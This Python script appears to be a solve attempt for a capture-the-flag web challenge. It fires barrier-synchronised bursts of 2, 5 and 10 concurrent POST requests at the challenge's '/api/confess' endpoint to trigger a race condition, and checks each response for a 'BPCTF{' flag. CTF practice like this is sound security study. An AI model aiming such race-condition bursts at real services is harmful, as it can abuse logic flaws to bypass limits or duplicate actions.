import requests
import time
from concurrent.futures import ThreadPoolExecutor
import threading

base_url = "https://valentine.breachpoint.live"

print("=== Testing TRUE synchronization (race condition) ===\n")

# The hint says "synchronized" - maybe we need TWO requests to hit at the EXACT same millisecond
# WITHOUT the cookie manipulation

barrier = threading.Barrier(2)
results = []

def synchronized_request(thread_id):
    barrier.wait()  # Wait for all threads to be ready
    # Now all threads execute at the same time
    r = requests.post(
        base_url + "/api/confess",
        json={"message": "forever"}
    )
    results.append({
        "thread": thread_id,
        "status": r.status_code,
        "text": r.text,
        "timestamp": time.time()
    })

# Try with 2 threads
threads = []
for i in range(2):
    t = threading.Thread(target=synchronized_request, args=(i,))
    threads.append(t)
    t.start()

for t in threads:
    t.join()

print("Results from synchronized requests:")
for r in results:
    print(f"Thread {r['thread']}: {r['status']} - {r['text']}")
    if "BPCTF{" in r['text'] and "simple" not in r['text']:
        print(f"\n🎉 REAL FLAG FOUND: {r['text']}")

# Try with more threads
print("\n=== Testing with 5 synchronized threads ===\n")
barrier = threading.Barrier(5)
results = []

threads = []
for i in range(5):
    t = threading.Thread(target=synchronized_request, args=(i,))
    threads.append(t)
    t.start()

for t in threads:
    t.join()

for r in results:
    print(f"Thread {r['thread']}: {r['status']} - {r['text']}")
    if "BPCTF{" in r['text'] and "simple" not in r['text']:
        print(f"\n🎉 REAL FLAG FOUND: {r['text']}")

# Try with 10 threads
print("\n=== Testing with 10 synchronized threads ===\n")
barrier = threading.Barrier(10)
results = []

threads = []
for i in range(10):
    t = threading.Thread(target=synchronized_request, args=(i,))
    threads.append(t)
    t.start()

for t in threads:
    t.join()

success_count = sum(1 for r in results if r['status'] == 200)
print(f"\nSuccessful requests: {success_count}/10")

for r in results:
    if r['status'] == 200:
        print(f"Thread {r['thread']}: {r['text']}")
        if "BPCTF{" in r['text'] and "simple" not in r['text']:
            print(f"\n🎉 REAL FLAG FOUND!")

# Check if multiple successful requests reveal something
unique_responses = set(r['text'] for r in results if r['status'] == 200)
print(f"\nUnique responses: {unique_responses}")
